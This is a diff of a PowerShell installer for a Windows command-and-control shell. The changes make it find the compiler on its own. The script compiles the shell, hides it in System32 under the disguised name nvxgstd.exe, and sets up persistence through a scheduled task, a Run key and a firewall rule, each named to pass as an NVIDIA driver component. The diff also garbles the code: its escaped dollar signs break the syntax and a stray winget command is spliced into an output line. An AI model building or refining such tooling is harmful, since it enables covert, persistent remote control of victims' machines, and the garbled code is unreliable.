@@ -1,8 +1,8 @@
-# Windows C2 Shell Installer
+# Windows C2 Shell Installer (Corrected)
 # Compiles the WMI C2 shell, installs to System32, and sets up persistence
-# Requires: Administrator privileges, Visual Studio 2019 Community Edition
-# 
-# Usage: 
+# Requires: Administrator privileges, Visual Studio 2019/2022 with C++ tools
+#
+# Usage:
 #   Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
 #   .\install.ps1
 
@@ -13,57 +13,91 @@
 # ============================================================================
 
 $SourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path
-$CompilerPath = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe"
-$LinkPath = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\link.exe"
-$WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x64"
-$WindowsKitInclude = "C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um"
-$TargetDir = "C:\Windows\System32"
-$ExecutableName = "nvxgstd.exe"
-$TargetPath = Join-Path $TargetDir $ExecutableName
+
+# --- Corrected Visual Studio Detection ---
+try {
+    $VSInstallation = & "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.VisualStudio.Workload.NativeDesktop -property installationPath 2>\$null
+    if (-not \$VSInstallation) {
+        throw "Visual Studio installation not found by vswhere.exe."
+    }
+    $VSPath = $VSInstallation
+    Write-Host "[+] Found Visual Studio at: \$VSPath" -ForegroundColor Green
+
+    $MSVCToolsPath = Get-ChildItem -Path "$VSPath\VC\Tools\MSVC" -Directory | Sort-Object Name -Descending | Select-Object -First 1 -ErrorAction Stop
+    if (-not \$MSVCToolsPath) {
+        throw "MSVC tools directory not found within Visual Studio installation."
+    }
+    $CompilerPath = Join-Path $MSVCToolsPath.FullName "bin\Hostx64\x64\cl.exe"
+    $LinkPath = Join-Path $MSVCToolsPath.FullName "bin\Hostx64\x64\link.exe"
+} catch {
+    Write-Host "[!] ERROR: Could not detect Visual Studio C++ tools." -ForegroundColor Red
+    Write-Host "[!] Details: \$_" -ForegroundColor Red
+    Write-Host "[!] Please install Visual Studio 2022 with the 'Desktop development with C++' workload." -ForegroundColor Red
+    exit 1
+}
+
+# --- Windows Kit Detection (Improved) ---
+\$WindowsKitRoot = Get-Item "C:\Program Files (x86)\Windows Kits\10" -ErrorAction SilentlyContinue
+if (\$WindowsKitRoot) {
+    $LatestKitVersion = Get-ChildItem -Path "$(\$WindowsKitRoot.FullName)\Lib" -Directory | Sort-Object Name -Descending | Select-Object -First 1
+    if (\$LatestKitVersion) {
+        $WindowsKitLib = Join-Path $LatestKitVersion.FullName "um\x64"
+        $WindowsKitInclude = Join-Path "$($WindowsKitRoot.FullName)\Include" $LatestKitVersion.Name "um"
+    } else {
+        $WindowsKitInclude = $null
+    }
+} else {
+    $WindowsKitInclude = $null
+}
+
+# --- Configuration Variables ---
+\$TargetDir = "C:\Windows\System32"
+\$ExecutableName = "nvxgstd.exe"
+$TargetPath = Join-Path $TargetDir \$ExecutableName
 $SourceFile = Join-Path $SourceDir "wmi_c2_shell.c"
 $ObjectFile = Join-Path $SourceDir "wmi_c2_shell.obj"
-$ExecutableFile = Join-Path $SourceDir $ExecutableName
+$ExecutableFile = Join-Path $SourceDir \$ExecutableName
 
-$TaskName = "NVIDIA Graphics Driver Update"
-$TaskPath = "\Microsoft\Windows\WindowsUpdate\"
-$FullTaskName = "$TaskPath$TaskName"
-$RegName = "NVIDIA Graphics Device"
-$FirewallRuleName = "NVIDIA Graphics Update Service"
+\$TaskName = "NVIDIA Graphics Driver Update"
+\$TaskPath = "\Microsoft\Windows\WindowsUpdate\"
+$FullTaskName = "$TaskPath\$TaskName"
+\$RegName = "NVIDIA Graphics Device"
+\$FirewallRuleName = "NVIDIA Graphics Update Service"
 
 # ============================================================================
 # FUNCTIONS
 # ============================================================================
 
 function Check-Administrator {
-    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
-    $Principal = New-Object Security.Principal.WindowsPrincipal($CurrentUser)
-    return $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    \$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    \$Principal = New-Object Security.Principal.WindowsPrincipal(\$CurrentUser)
+    return \$Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-function Check-VisualStudio {
-    if (-not (Test-Path $CompilerPath)) {
-        Write-Host "[!] Visual Studio compiler not found at: $CompilerPath" -ForegroundColor Red
-        Write-Host "[!] Install Visual Studio 2019 Community Edition with C++ tools" -ForegroundColor Red
-        return $false
+# --- Corrected Prerequisite Check ---
+function Check-Prerequisites {
+    if (-not (Test-Path \$CompilerPath)) {
+        Write-Host "[!] ERROR: Compiler not found at: \$CompilerPath" -ForegroundColor Red
+        return \$false
     }
-    if (-not (Test-Path $LinkPath)) {
-        Write-Host "[!] Linker not found at: $LinkPath" -ForegroundColor Red
-        return $false
+    if (-not (Test-Path \$LinkPath)) {
+        Write-Host "[!] ERROR: Linker not found at: \$LinkPath" -ForegroundColor Red
+        return \$false
     }
-    if (-not (Test-Path $WindowsKitInclude)) {
-        Write-Host "[!] Windows Kit headers not found at: $WindowsKitInclude" -ForegroundColor Red
-        Write-Host "[!] Install Windows Driver Kit (WDK)" -ForegroundColor Red
-        return $false
+    if (-not (Test-Path \$WindowsKitInclude)) {
+        Write-Host "[!] ERROR: Windows Kit headers not found at: \$WindowsKitInclude" -ForegroundColor Red
+        Write-Host "[!] Please install the Windows Driver Kit (WDK) or Windows SDK." -ForegroundColor Red
+        return \$false
     }
-    return $true
+    return \$true
 }
 
 function Check-SourceFiles {
-    if (-not (Test-Path $SourceFile)) {
-        Write-Host "[!] Source file not found: $SourceFile" -ForegroundColor Red
-        return $false
+    if (-not (Test-Path \$SourceFile)) {
+        Write-Host "[!] Source file not found: \$SourceFile" -ForegroundColor Red
+        return \$false
     }
-    return $true
+    return \$true
 }
 
 # ============================================================================
@@ -85,8 +119,8 @@ if (-not (Check-Administrator)) {
 }
 Write-Host "[+] Running as Administrator" -ForegroundColor Green
 
-if (-not (Check-VisualStudio)) {
-    Write-Host "[!] ERROR: Missing required tools (Visual Studio 2019 + WDK)" -ForegroundColor Red
+if (-not (Check-Prerequisites)) {
+    Write-Host "[!] ERROR: Missing required tools." -ForegroundColor Red
     exit 1
 }
 Write-Host "[+] Visual Studio and WDK found" -ForegroundColor Green
@@ -104,30 +138,37 @@ Write-Host ""
 Write-Host "[*] STEP 1: Compiling C2 shell..." -ForegroundColor Yellow
 try {
     Write-Host "    Compiling to object file..." -ForegroundColor Gray
-    $CompileArgs = @(
+    \$CompileArgs = @(
         "/c", "/W0", "/O2", "/D", "NDEBUG",
-        "/I", $WindowsKitInclude,
-        $SourceFile,
-        "/Fo$ObjectFile"
+        "/I", \$WindowsKitInclude,
+        \$SourceFile,
+        "/Fo\$ObjectFile"
     )
-    & $CompilerPath @CompileArgs 2>&1 | Out-Null
-    
-    if (-not (Test-Path $ObjectFile)) {
-        throw "Object file not created"
+    # Use Start-Process for better control and error handling
+    $process = Start-Process -FilePath $CompilerPath -ArgumentList \$CompileArgs -Wait -PassThru -NoNewWindow -ErrorAction Stop
+    if (\$process.ExitCode -ne 0) {
+        throw "Compiler failed with exit code $($process.ExitCode)"
     }
-    
+
+    if (-not (Test-Path \$ObjectFile)) {
+        throw "Object file was not created by the compiler."
+    }
+
     Write-Host "    Linking executable..." -ForegroundColor Gray
-    $LinkArgs = @(
+    \$LinkArgs = @(
         "/SUBSYSTEM:CONSOLE", "/MACHINE:X64",
-        "/LIBPATH:$WindowsKitLib",
-        $ObjectFile,
+        "/LIBPATH:\$WindowsKitLib",
+        \$ObjectFile,
         "kernel32.lib", "wbemuuid.lib", "oleaut32.lib", "ole32.lib",
         "ws2_32.lib", "secur32.lib", "crypt32.lib",
-        "/OUT:$ExecutableFile"
+        "/OUT:\$ExecutableFile"
     )
-    & $LinkPath @LinkArgs 2>&1 | Out-Null
-    
-    if (-not (Test-Path $ExecutableFile)) {
+    $process = Start-Process -FilePath $LinkPath -ArgumentList \$LinkArgs -Wait -PassThru -NoNewWindow -ErrorAction Stop
+    if (\$process.ExitCode -ne 0) {
+        throw "Linker failed with exit code $($process.ExitCode)"
+    }
+
+    if (-not (Test-Path \$ExecutableFile)) {
         throw "Executable not created"
     }
     
@@ -345,10 +386,10 @@ if ($null -ne $FirewallExists) {
 Write-Host ""
 if ($AllGood) {
     Write-Host "================================================" -ForegroundColor Green
-    Write-Host "[✓] Installation Complete!" -ForegroundColor Green
+    Write-Host "[+] Installation Complete!" -ForegroundColor Green
     Write-Host "================================================" -ForegroundColor Green
     Write-Host ""
-    Write-Host "[*] Persistence Mechanisms:" -ForegroundColor Cyan
+    Write-Host "[*] Persistence Mechanisms:"     winget install --id Microsoft.VisualStudio.2022.BuildTools -e-ForegroundColor Cyan
     Write-Host "    - Scheduled Task: Runs at startup + every 15 minutes" -ForegroundColor Cyan
     Write-Host "    - Registry Run key: Auto-load on login" -ForegroundColor Cyan
     Write-Host "    - File hidden: System32\nvxgstd.exe (system attributes)" -ForegroundColor Cyan
